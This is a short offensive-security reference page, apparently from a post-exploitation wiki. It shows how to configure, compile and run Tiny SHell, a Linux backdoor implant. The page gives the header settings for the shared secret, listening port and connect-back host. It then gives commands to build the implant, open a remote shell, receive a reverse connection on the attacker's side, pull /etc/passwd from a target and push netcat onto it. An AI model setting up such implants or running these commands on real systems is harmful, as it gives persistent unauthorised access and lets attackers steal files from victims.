---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - linux
---
# Tiny SHell (tsh)

Start with editing `tsh.h` file. Change `secret`, specify `SERVER_PORT`. Uncomment and edit `CONNECT_BACK_HOST` and `CONNECT_BACK_DELAY` directives if you want backconnect.

```c
#ifndef _TSH_H
#define _TSH_H

char *secret = "never say never say die";

#define SERVER_PORT 22
short int server_port = SERVER_PORT;
/*
#define CONNECT_BACK_HOST "localhost"
#define CONNECT_BACK_DELAY 30
*/
#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3

#endif
```

Compile implant.

```
$ make linux_x64
```

Now run `./tshd` on server. It will start listening on the specified port. You can connect to it via executing the following command:

```
$ ./tsh host_ip
```

If `tsh` was compiled with backconnect capability, the `tshd` daemon will try to connect back to the attackerâ€™s machine. To launch listener on attacker's side:

```
$ ./tsh cb
Waiting for the server to connect...
```

To transfer files.

```
$ ./tsh host_ip get /etc/passwd .
$ ./tsh host_ip put /bin/netcat /tmp
```

---
## References

- [creaktive: tsh](https://github.com/creaktive/tsh)